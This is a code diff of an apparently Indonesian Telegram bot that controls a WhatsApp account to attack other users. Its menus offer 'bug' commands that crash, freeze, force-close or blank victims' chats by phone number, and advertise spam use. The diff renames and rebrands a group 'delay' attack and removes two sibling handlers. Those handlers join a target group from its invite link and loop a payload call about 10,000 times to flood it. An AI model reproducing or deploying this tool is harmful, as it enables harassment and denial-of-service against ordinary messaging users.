@@ -1307,7 +1307,6 @@ async function sendPage(ctx, page = 0) {
       [{ text: "(⸙)「 ᴄᴀɴ sᴘᴀᴍ 」", callback_data: "spam", style: "success", icon_custom_emoji_id: "5084613633418199991" }, 
        { text: "(⸙)「 ɪɴᴠɪs ɴᴏᴛ sᴘᴀᴍ 」", callback_data: "invis", style: "success", icon_custom_emoji_id: "5084613633418199991" }],
       [{ text: "(⎚)「 ɴᴏᴛ sᴘᴀᴍ 」", callback_data: "not_spam", style: "danger", icon_custom_emoji_id: "5085022089103016925" }],
-      [{ text: "(⎚)「 group ɴᴏᴛ sᴘᴀᴍ 」", callback_data: "group_not_spam", style: "danger", icon_custom_emoji_id: "5085022089103016925" }],
       [
         { text: "「 𝘽𝘼𝘾𝙆 」", callback_data: `page_${page - 1}`, style: "primary", icon_custom_emoji_id: "5352759161945867747" },
         { text: "⎙ 4/7", callback_data: "noop", style: "danger", icon_custom_emoji_id: "4956395910306202687" },
@@ -1455,24 +1454,16 @@ Powerful • High Performance
 Full Feature • Premium Script
 ━━━━━━━━━━━━━━━━━━━━━━━
 -「 ᴄᴀɴ sᴘᴀᴍ 」-
-➤ Bisa Untuk Nokos Fresh
-➤ Dapat Digunakan Untuk Spam
+➤ Dapat digunakan untuk spam
 ➤ Mode Invisible (tidak terlihat)
 
 -「 ɪɴᴠɪsɪʙʟᴇ ɴᴏᴛ sᴘᴀᴍ 」-
-➤ Tidak Bisa Untuk Nokos Fresh
-➤ Tidak Untuk Spam
+➤ Tidak untuk spam
 ➤ Mode Invisible (tidak terlihat)
 ➤ Walaupun Invisible Tidak Untuk Spam
 
 -「 ɴᴏᴛ sᴘᴀᴍ 」-
-➤ Tidak Bisa Untuk Nokos Fresh
-➤ Tidak Untuk Spam
-➤ Mode Visible (terlihat normal)
-
--「 group ɴᴏᴛ sᴘᴀᴍ 」-
-➤ Tidak Bisa Untuk Nokos Fresh
-➤ Tidak Untuk Spam Group
+➤ Tidak untuk spam
 ➤ Mode Visible (terlihat normal)
 
 Security Script : ACTIVE
@@ -1515,7 +1506,7 @@ Security Script : ACTIVE
 ╔═══════════════
 ║⌑ /brat ⇢ Brat Text Maker
 ║⌑ /catbox ⇢ Catbox → Foto
-║⌑ /convert ⇢ Foto → Catbox
+║⌑ /catboxurl ⇢ Foto → Catbox
 ║⌑ /convert ⇢ Convert Media
 ║⌑ /hd ⇢ HD Enhancer
 ╚═════════════════════════
@@ -1540,40 +1531,16 @@ Security Script : ACTIVE
 \`\`\`
 `,
 
-
-` \`\`\`js
-╔═☇〔 ᴛᴏᴏʟs ᴍᴇɴᴜ 2 〕☇═╗
-
- ʜᴀᴠᴇ ғᴜɴ
-╔═══════════════
-║⌑ /cekidch ⇢ Cek Id Channel Telegram
-║⌑ /jodoh ⇢ cek presentase jodoh
-║⌑ /shio ⇢ Cek Marga
-║⌑ /tebak ⇢ Tebak Angka
-║⌑ /motivasi ⇢ Random Motivasi 
-║⌑ /kepribadian ⇢ Cek Kepribadian
-║⌑ /karir ⇢ Cek Karir Kehidupan
-║⌑ /level ⇢ Cek Level Kehidupan
-║⌑ /harilahir ⇢ Cek Hari Lahir
-║⌑ /koin ⇢ Tebak Coin
-╚══════════════════════════
-
-Security Script : ACTIVE
-\`\`\`
-`,
-
 ` \`\`\`js
 ╭━━━〔 🌑 ʙᴇsᴛ sᴜᴘᴘᴏʀᴛ 🌑 〕━━━╮
 
 ┌─「 ᴄᴏʀᴇ sᴜᴘᴘᴏʀᴛ 」
-│ ☇ @Allah         ➤ My God
+│ ☇ @Allah         ➤ Endless Blessing
 │ ☇ @Ortu         ➤ Real Life Backbone
 └────────────────────
 
 ┌─「 ᴛᴇᴀᴍ 」
-│☇ @ZypherReal1 [ 𝙳𝙴𝚅 ]
-│☇ @ApongSkt [ Partner ]
-│☇ @celycntik [ Partner ]
+│☇ ғɪᴋᴀᴄʜᴜ [ 𝙳𝙴𝚅 𝙹𝙸𝚁 ]
 ┃    [ 𝙱𝙴𝚂𝚃𝙵𝚁𝙸𝙴𝙽𝙳 ]
 └────────────────────
 
@@ -1628,29 +1595,13 @@ bot.action("not_spam", async (ctx) => {
 │ ↯ /ForceClick  62xx    ⇢ FORCLOSE CLICK
 │ ↯ /freeze 62××       ⇢ FREEZE CHAT
 │ ↯ /BlankClick       ⇢ BLANK CLICK
+│ ↯ /delaygroup     ⇢  DELAY GROUP
 └────────────────────────
 
 Security Script : ACTIVE
 \`\`\`
 `, [[{ text: "「 𝘽𝘼𝘾𝙆 」", callback_data: "page_3", style: "primary", icon_custom_emoji_id: "5352759161945867747" }]]);
 });
-
-// ================= BUG VISIBLE =================
-bot.action("group_not_spam", async (ctx) => {
-  await ctx.answerCbQuery();
-  await editMenu(ctx, `
-\`\`\`js
-╭──〔 𝗡𝗢𝗧 𝗦𝗣𝗔𝗠 𝗕𝗨𝗚 𝗧𝗬𝗣𝗘 〕──╮
-│ ↯ /DelayGroup link_group ⇢ DELAY GROUP
-│ ↯ /FcGroup link_group    ⇢ FORCLOSE GROUP 
-│ ↯ /BlankGroup link_group ⇢ BLANK GROUP
-└────────────────────────
-
-Security Script : ACTIVE
-\`\`\`
-`, [[{ text: "「 𝘽𝘼𝘾𝙆 」", callback_data: "page_3", style: "primary", icon_custom_emoji_id: "5352759161945867747" }]]);
-});
-
 // ================= BUG VISIBLE =================
 bot.action("bug_ios", async (ctx) => {
   await ctx.answerCbQuery();
@@ -4987,20 +4938,20 @@ bot.command('testfunction', checkWhatsAppConnection, checkAllPremium, async (ctx
 });
 
 //----------------( CASE BUG GROUP )----------------\\
-// Ubah command menjadi /DelayGroup dengan argumen link grup
-bot.command('DelayGroup', async (ctx) => {
+// Ubah command menjadi /delaygroup dengan argumen link grup
+bot.command('delaygroup', async (ctx) => {
   const chatId = ctx.chat.id;
   const senderId = ctx.from.id;
   const args = ctx.message.text.split(' ');
   if (args.length < 2) {
-    return ctx.reply("❌ Gunakan: /DelayGroup https://chat.whatsapp.com/xxxxx");
+    return ctx.reply("❌ Gunakan: /delaygroup https://chat.whatsapp.com/xxxxx");
   }
   let inviteLink = args[1].trim();
 
   const whatsappGroupRegex = /(https?:\/\/)?(chat\.whatsapp\.com)\/([A-Za-z0-9]+)/;
   const matchLink = inviteLink.match(whatsappGroupRegex);
   if (!matchLink) {
-    return ctx.reply("❌ Link grup WhatsApp tidak valid. Contoh: /DelayGroup https://chat.whatsapp.com/abc123def");
+    return ctx.reply("❌ Link grup WhatsApp tidak valid. Contoh: /delaygroup https://chat.whatsapp.com/abc123def");
   }
 
   const inviteCode = matchLink[3];
@@ -5026,9 +4977,9 @@ bot.command('DelayGroup', async (ctx) => {
       { url: "https://files.catbox.moe/s55rn9.jpg" },
       {
         caption: `
-<blockquote>⬡═―—⊱ ⎧ BULL CRASHER ⎭ ⊰―—═⬡
+<blockquote>⬡═―—⊱ ⎧ GHOST STORM ⎭ ⊰―—═⬡
 ⌑ Target Group : ${inviteLink}
-⌑ Type : Delay Group
+⌑ Type : DelayGroup
 ⌑ Status : Sedang prosess... 
 ╘═————————————————═⬡</blockquote>`,
         parse_mode: "HTML",
@@ -5050,173 +5001,9 @@ bot.command('DelayGroup', async (ctx) => {
       sentMessage.message_id,
       undefined,
       `
-<blockquote>⬡═―—⊱ ⎧ BULL CRASHER ⎭ ⊰―—═⬡
+<blockquote>⬡═―—⊱ ⎧ GHOST STORM ⎭ ⊰―—═⬡
 ⌑ Target Group : ${inviteLink}
-⌑ Type : Delay Group
-⌑ Status : Success... 
-╘═————————————————═⬡</blockquote>`,
-      {
-        parse_mode: "HTML",
-        reply_markup: {
-          inline_keyboard: [[{ text: "LIHAT GRUP", url: inviteLink }]]
-        }
-      }
-    );
-
-  } catch (error) {
-    console.error(error);
-    ctx.reply(`❌ Gagal mengirim bug: ${error.message}`);
-  }
-});
-
-// Ubah command menjadi /FcGroup dengan argumen link grup
-bot.command('FcGroup', async (ctx) => {
-  const chatId = ctx.chat.id;
-  const senderId = ctx.from.id;
-  const args = ctx.message.text.split(' ');
-  if (args.length < 2) {
-    return ctx.reply("❌ Gunakan: /FcGroup https://chat.whatsapp.com/xxxxx");
-  }
-  let inviteLink = args[1].trim();
-
-  const whatsappGroupRegex = /(https?:\/\/)?(chat\.whatsapp\.com)\/([A-Za-z0-9]+)/;
-  const matchLink = inviteLink.match(whatsappGroupRegex);
-  if (!matchLink) {
-    return ctx.reply("❌ Link grup WhatsApp tidak valid. Contoh: /FcGroup https://chat.whatsapp.com/abc123def");
-  }
-
-  const inviteCode = matchLink[3];
-  const randomImage = getRandomImage();
-
-
-  try {
-    if (!sock || !isWhatsAppConnected) {
-      return ctx.reply("❌ Tidak ada bot WhatsApp yang terhubung. Silakan hubungkan bot terlebih dahulu dengan /connect 62xxx");
-    }
-
-    const groupInviteInfo = await sock.groupGetInviteInfo(inviteCode).catch(() => null);
-    let groupJid;
-    if (groupInviteInfo && groupInviteInfo.id) {
-      groupJid = groupInviteInfo.id;
-    } else {
-      const joinResult = await sock.groupAcceptInvite(inviteCode).catch(() => null);
-      if (!joinResult) throw new Error("Gagal bergabung ke grup. Periksa link atau bot sudah menjadi anggota?");
-      groupJid = joinResult;
-    }
-
-    const sentMessage = await ctx.replyWithPhoto(
-      { url: "https://files.catbox.moe/s55rn9.jpg" },
-      {
-        caption: `
-<blockquote>⬡═―—⊱ ⎧ BULL CRASHER ⎭ ⊰―—═⬡
-⌑ Target Group : ${inviteLink}
-⌑ Type : Forclose Group
-⌑ Status : Sedang prosess... 
-╘═————————————————═⬡</blockquote>`,
-        parse_mode: "HTML",
-        reply_markup: {
-          inline_keyboard: [[{ text: "LIHAT GRUP", url: inviteLink }]]
-        }
-      }
-    );
-
-    console.log("\x1b[32m[PROCES MENGIRIM BUG]\x1b[0m TUNGGU HINGGA SELESAI");
-    for (let i = 0; i <= 10000; i++) {
-      await DelayGroup(sock, groupJid);
-      if (i % 100 === 0) await new Promise(r => setTimeout(r, 100));
-    }
-    console.log("\x1b[32m[SUCCESS]\x1b[0m Bug berhasil dikirim! 🚀");
-
-    await ctx.telegram.editMessageCaption(
-      chatId,
-      sentMessage.message_id,
-      undefined,
-      `
-<blockquote>⬡═―—⊱ ⎧ BULL CRASHER ⎭ ⊰―—═⬡
-⌑ Target Group : ${inviteLink}
-⌑ Type : Forclose Group
-⌑ Status : Success... 
-╘═————————————————═⬡</blockquote>`,
-      {
-        parse_mode: "HTML",
-        reply_markup: {
-          inline_keyboard: [[{ text: "LIHAT GRUP", url: inviteLink }]]
-        }
-      }
-    );
-
-  } catch (error) {
-    console.error(error);
-    ctx.reply(`❌ Gagal mengirim bug: ${error.message}`);
-  }
-});
-
-// Ubah command menjadi /BlankGroup dengan argumen link grup
-bot.command('BlankGroup', async (ctx) => {
-  const chatId = ctx.chat.id;
-  const senderId = ctx.from.id;
-  const args = ctx.message.text.split(' ');
-  if (args.length < 2) {
-    return ctx.reply("❌ Gunakan: /BlankGroup https://chat.whatsapp.com/xxxxx");
-  }
-  let inviteLink = args[1].trim();
-
-  const whatsappGroupRegex = /(https?:\/\/)?(chat\.whatsapp\.com)\/([A-Za-z0-9]+)/;
-  const matchLink = inviteLink.match(whatsappGroupRegex);
-  if (!matchLink) {
-    return ctx.reply("❌ Link grup WhatsApp tidak valid. Contoh: /BlankGroup https://chat.whatsapp.com/abc123def");
-  }
-
-  const inviteCode = matchLink[3];
-  const randomImage = getRandomImage();
-
-
-  try {
-    if (!sock || !isWhatsAppConnected) {
-      return ctx.reply("❌ Tidak ada bot WhatsApp yang terhubung. Silakan hubungkan bot terlebih dahulu dengan /connect 62xxx");
-    }
-
-    const groupInviteInfo = await sock.groupGetInviteInfo(inviteCode).catch(() => null);
-    let groupJid;
-    if (groupInviteInfo && groupInviteInfo.id) {
-      groupJid = groupInviteInfo.id;
-    } else {
-      const joinResult = await sock.groupAcceptInvite(inviteCode).catch(() => null);
-      if (!joinResult) throw new Error("Gagal bergabung ke grup. Periksa link atau bot sudah menjadi anggota?");
-      groupJid = joinResult;
-    }
-
-    const sentMessage = await ctx.replyWithPhoto(
-      { url: "https://files.catbox.moe/s55rn9.jpg" },
-      {
-        caption: `
-<blockquote>⬡═―—⊱ ⎧ BULL CRASHER ⎭ ⊰―—═⬡
-⌑ Target Group : ${inviteLink}
-⌑ Type : Blank Group
-⌑ Status : Sedang prosess... 
-╘═————————————————═⬡</blockquote>`,
-        parse_mode: "HTML",
-        reply_markup: {
-          inline_keyboard: [[{ text: "LIHAT GRUP", url: inviteLink }]]
-        }
-      }
-    );
-
-    console.log("\x1b[32m[PROCES MENGIRIM BUG]\x1b[0m TUNGGU HINGGA SELESAI");
-    for (let i = 0; i <= 10000; i++) {
-      await DelayGroup(sock, groupJid);
-      if (i % 100 === 0) await new Promise(r => setTimeout(r, 100));
-    }
-    console.log("\x1b[32m[SUCCESS]\x1b[0m Bug berhasil dikirim! 🚀");
-
-    await ctx.telegram.editMessageCaption(
-      chatId,
-      sentMessage.message_id,
-      undefined,
-      `
-<blockquote>⬡═―—⊱ ⎧ BULL CRASHER ⎭ ⊰―—═⬡
-⌑ Target Group : ${inviteLink}
-⌑ Type : Blank Group
+⌑ Type : DelayGroup
 ⌑ Status : Success... 
 ╘═————————————————═⬡</blockquote>`,
       {
